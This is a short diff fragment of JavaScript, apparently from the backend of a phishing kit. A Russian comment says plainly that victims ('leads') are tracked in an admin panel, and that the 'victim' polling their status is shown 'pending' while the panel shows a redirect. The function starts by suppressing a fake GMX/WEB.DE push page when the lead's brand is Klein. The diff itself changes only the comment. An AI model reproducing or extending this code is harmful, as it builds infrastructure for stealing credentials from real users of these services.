@@ -878,7 +878,7 @@ function writeStartPage(value) {
   fs.writeFileSync(START_PAGE_FILE, v, 'utf8');
 }
 
-/** У Klein нет GMX/WEB.DE push-страницы на фишинге. В leads.json статус может быть redirect_push (админка, бейдж Push), а в поллинге статуса жертве отдаём pending — см. обработчик lead-status. */
+/** У Klein нет GMX/WEB.DE push-страницы на фишинге. В БД статус может быть redirect_push (админка, бейдж Push), а в поллинге статуса жертве отдаём pending — см. обработчик lead-status. */
 function suppressVictimPushPageForKleinContext(lead) {
   if (!lead) return false;
   if (lead.brand === 'klein') return true;
